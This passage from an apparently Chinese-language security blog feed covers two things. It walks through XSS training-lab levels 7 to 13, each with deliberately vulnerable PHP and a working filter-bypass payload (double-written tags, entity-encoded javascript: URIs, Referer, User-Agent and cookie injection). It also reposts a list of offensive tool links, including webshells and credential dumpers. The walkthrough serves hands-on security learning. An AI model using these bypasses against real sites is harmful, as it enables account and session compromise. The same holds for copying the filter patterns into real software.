<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><code>123&quot;&gt;&lt;scriscriptpt&gt;alert(7)&lt;/scrscriptipt&gt;//</code></p>
<p><code>123&quot;oonnclick=alert(7) //</code></p>
<br>

<p>8.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>javascrip&amp;#x74;:alert(1)//</code>æˆ–è€…</p>
<p><code>javascr%09ipt:alert(1)</code> %09å¯¹å…³é”®å­—éš”æ–­ ç„¶åè¿›è¡Œå®ä½“ç¼–ç <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
<br>

<br>

<p>9.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸ä¸Šä¸€å…³ç›¸æ¯”å¤šäº†ä¸€ä¸ªurlæ£€æµ‹,å¦‚æœæ²¡æœ‰å¸¦http://å°±ä¼šæŠ¥é”™</p>
<p><code>javascrip&amp;#x74;:alert(1)//http://test.com//</code></p>
<p>10</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€é¢˜çš„<code>keyword</code>å‚æ•°ä¸éœ€è¦ç®¡,åªéœ€è¦æ§åˆ¶<code>t_sort</code> </p>
<p><code>t_sort=&quot; onclick=&#39;alert(1)&#39; type=&quot;text&quot;&gt;//</code></p>
<br>

<p>11.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨burpä¿®æ”¹referer </p>
<p><code>1&quot; type=&quot;text&quot; onclick=alert(1)//</code></p>
<p>12.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œåªä¸è¿‡å°±æ”¹UA </p>
<p>13</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ”¹cookie</p>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker_Tools-è½¬</title>
    <url>/posts/ec585c99/</url>
    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>æ¥æºï¼š<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
<h1 id="æ‰«æå™¨"><a href="#æ‰«æå™¨" class="headerlink" title="æ‰«æå™¨"></a>æ‰«æå™¨</h1><p>Nmapç«¯å£æ‰«æå™¨ï¼š<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>è¢«åŠ¨å¼æ³¨å…¥æ£€æµ‹å·¥å…·ï¼š <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>é«˜è´¨é‡æ‰«æLinux / FreeBSD Serverä¸­çš„ä»»ä½•æ¼æ´ï¼š<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>å­åŸŸåæ‰«æå™¨ï¼š<br>Altdns-é€šè¿‡å˜æ›´å’Œæ’åˆ—å‘ç°å­åŸŸï¼š<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBruteä½¿ç”¨å¼€æ”¾å¼è§£æå™¨ä½œä¸ºä¸€ç§ä»£ç†æ¥è§„é¿DNSé€Ÿç‡é™åˆ¶ï¼š<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2ä¸€ä¸ªé’ˆå¯¹æ¸—é€æµ‹è¯•è€…çš„å¿«é€Ÿå­åŸŸæš´åŠ›å·¥å…·ï¼š<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>æœ¬åœ°ç½‘ç»œæ‰«æå™¨ï¼ˆæ‰“å¼€ç½‘é¡µæ—¶æ‰«ææœ¬åœ°ç½‘ç»œçš„PoC Javascriptï¼‰ï¼š<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiseråŸºäºç«¯å£æ‰«æä»¥åŠå…³è”CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-é¡µé¢ä¸Šçš„æ¼æ´è·¯ç”±å™¨ï¼š<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>é˜²ç«å¢™æ£€æµ‹å·¥å…·ï¼š<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>æ¼æ´æ‰«æç¨‹åºï¼Œä»¥æœ€å°‘çš„è§„åˆ™é›†åœ¨çŸ­æ—¶é—´å†…æ‰«æå¤§é‡ç›®æ ‡ï¼š<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>åŸºäºSQLMAPçš„ä¸»åŠ¨å’Œè¢«åŠ¨SQLæ³¨å…¥çš„æ¼æ´æ‰«æå·¥å…·ï¼š <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
<h1 id="ä¿¡æ¯æœé›†å·¥å…·"><a href="#ä¿¡æ¯æœé›†å·¥å…·" class="headerlink" title="ä¿¡æ¯æœé›†å·¥å…·"></a>ä¿¡æ¯æœé›†å·¥å…·</h1><p>ç¤¾å·¥æ”¶é›†å·¥å…·ï¼š<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>ä¿¡æ¯æ‰«æå·¥å…·ï¼š<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>æœ¬åœ°ç½‘ç»œæ‰«æä»ªï¼š<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>é€šè¿‡RDPæ‰«æå¯è®¿é—®æ€§å·¥å…·åé—¨ï¼š<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>ç½‘ç»œåŸºç¡€è®¾æ–½æ¸—é€æµ‹è¯•å·¥å…·ï¼š<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHubä¿¡æ¯æ”¶é›†ï¼š<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
<h1 id="å¯†ç ç ´è§£"><a href="#å¯†ç ç ´è§£" class="headerlink" title="å¯†ç ç ´è§£"></a>å¯†ç ç ´è§£</h1><p>å¯†ç ç ´è§£å·¥å…·ï¼ˆå¼€è†›æ‰‹Johnnyï¼‰:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>è·å–å­˜å‚¨åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šå¤§é‡çš„å¯†ç ï¼š<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMPæš´åŠ›ç ´è§£ï¼š<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
<h1 id="Webæ¸—é€ï¼ˆç¦æ­¢ç”¨ä½œè¿æ³•ï¼‰"><a href="#Webæ¸—é€ï¼ˆç¦æ­¢ç”¨ä½œè¿æ³•ï¼‰" class="headerlink" title="Webæ¸—é€ï¼ˆç¦æ­¢ç”¨ä½œè¿æ³•ï¼‰"></a>Webæ¸—é€ï¼ˆç¦æ­¢ç”¨ä½œè¿æ³•ï¼‰</h1><p>HTTPæš´åŠ›ç ´è§£ï¼Œæ’åº“æ”»å‡»è„šæœ¬ï¼š<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshellï¼š<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>å…æ€webshellæ— é™ç”Ÿæˆå·¥å…·ï¼š<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>æ¸—é€å·¥å…·åˆé›†ï¼š<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-æ–¹ä¾¿XSSä¸CSRFçš„å·¥å…·ï¼š<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Webåº”ç”¨ç¨‹åºæ”»å‡»å’Œå®¡æ ¸æ¡†æ¶ï¼š<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>æ¸—é€æµ‹è¯•åŒ…ï¼š<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>ç½‘ç»œè·¯å¾„æ‰«æä»ªï¼š<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>ä»£ç æ³¨å…¥æ£€æµ‹å·¥å…·ï¼š <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtilsï¼š<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto WebæœåŠ¡å™¨æ‰«æä»ªï¼š<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>è‡ªåŠ¨åŒ–çš„å¤šåˆä¸€OSå‘½ä»¤æ³¨å…¥å’Œåˆ©ç”¨å·¥å…·ï¼š<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscanæµ‹è¯•ï¼š<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windowså®‰å…¨å·¥å…·å¥—ä»¶ï¼š<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apacheå®æ—¶æ—¥å¿—åˆ†æå™¨ç³»ç»Ÿï¼š<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>æ£€æµ‹ç½‘ç»œå…¥ä¾µçš„ç‰¹å¾ï¼Œæ¶æ„èœ˜è››ï¼ˆMalspiderï¼‰ï¼š<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>ä¸‹ä¸€ä»£ç½‘ç»œæ‰«æä»ªWhatWebï¼š<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScanï¼ŒWordPressæ¼æ´æ‰«æç¨‹åºï¼š<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>ã€sqlmapã€‘:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTPä»£ç†æœåŠ¡å™¨å’Œä¸€ä¸ªSQLMAP APIåŒ…è£…å™¨):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>ä¸­å›½èœåˆ€ï¼š<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Webåº”ç”¨ç¨‹åºæ¨¡ç³Šå™¨ï¼š<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
